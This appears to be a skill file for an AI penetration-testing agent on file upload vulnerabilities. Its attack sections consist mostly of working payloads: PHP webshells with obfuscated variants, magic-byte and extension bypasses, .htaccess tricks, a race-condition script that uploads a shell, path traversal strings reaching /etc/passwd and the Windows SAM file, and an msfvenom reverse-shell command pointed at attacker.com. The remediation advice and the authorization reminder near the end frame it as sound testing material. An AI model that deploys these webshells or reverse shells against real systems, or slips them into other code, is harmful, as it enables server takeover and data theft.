---
name: file-upload-testing
description: Professional techniques and methodology for file upload vulnerability testing
version: 1.0.0
---

# File Upload Vulnerability Testing

## Overview

File upload is a common web application feature with many security risks. This skill covers how to detect, exploit, and prevent file upload vulnerabilities.

## Vulnerability Types

### 1. Unvalidated File Type

**Front-end-only validation:**
```javascript
// Can be bypassed
if (!file.name.endsWith('.jpg')) {
  alert('Only images may be uploaded');
}
```

### 2. Unvalidated File Content

**Extension-only check:**
```php
// Risky code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path Traversal

**Unsanitized file names:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. File Name Overwrite

**Predictable file names:**
```
uploads/1.jpg
uploads/2.jpg
```

## Testing Method

### 1. Basic Detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test case variations:**
```
shell.PHP
shell.PhP
```

### 2. Content-Type Bypass

**Tamper with Content-Type:**
```
Content-Type: image/jpeg
# while the file content is PHP code
```

**Magic bytes:**
```php
// Prepend an image header to PHP code
GIF89a<?php phpinfo(); ?>
```

### 3. Parsing Vulnerabilities

**Apache parsing vulnerability:**
```
shell.php.xxx  # Apache may parse this as PHP
```

**IIS parsing vulnerability:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parsing vulnerability:**
```
shell.jpg%00.php
```

### 4. Race Condition

**Access the file immediately after upload:**
```python
# Upload a .php file and hit it after upload but before cleanup
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation Techniques

### PHP WebShell

**Basic webshell:**
```php
<?php system($_GET['cmd']); ?>
```

**One-liner shell:**
```php
<?php eval($_POST['a']); ?>
```

**Filter bypass:**
```php
<?php
$_GET['cmd']($_POST['a']);
// Usage: ?cmd=system
```

### .htaccess Exploitation

**Upload an .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg (actually PHP code)**

### Image Webshells

**GIF webshell:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG webshell:**
```bash
# Embed PHP code into a PNG with a tool
python3 png2php.py shell.php shell.png
```

### Combined with Local File Inclusion

**If an inclusion vulnerability exists:**
```
# Upload an image containing PHP code
# Then execute it via file inclusion
?file=uploads/shell.jpg
```

## Bypass Techniques

### Extension Bypass

**Double extensions:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case variations:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type Bypass

**Tamper with request headers:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Bypass

**Prepend file headers:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code Obfuscation

**Short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Variable tricks:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tooling

### Burp Suite

1. Intercept the file upload request
2. Tamper with the file name and content
3. Test various bypass techniques

### Upload Bypass

```bash
# Test file upload with various techniques
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell Generation

```bash
# Generate various webshells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verification and Reporting

### Verification Steps

1. Confirm a malicious file can be uploaded
2. Verify the file executes
3. Assess impact (command execution, data exposure, etc.)
4. Record a complete PoC
5. Record the confirmed vulnerability in the platform via the `report_finding` tool (the sole entry point for recording findings in this platform), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Essentials

- Vulnerability location and the upload feature
- Uploadable file types and how they execute
- Complete exploitation steps and PoC
- Remediation advice (file type validation, content checks, secure storage, etc.)

## Countermeasures

### Recommended Approaches

1. **File type whitelist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File content validation**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename uploaded files**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated storage**
   - Store files outside the web root
   - Serve them through a script proxy
   - Disable execution permission

5. **File scanning**
   - Scan uploads with antivirus
   - Inspect file content
   - Strip executable permission

6. **Size limits**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Notes

- Test only in authorized environments
- Avoid uploading malicious files to production
- Clean up promptly after testing
- Parsing behavior differs across web servers
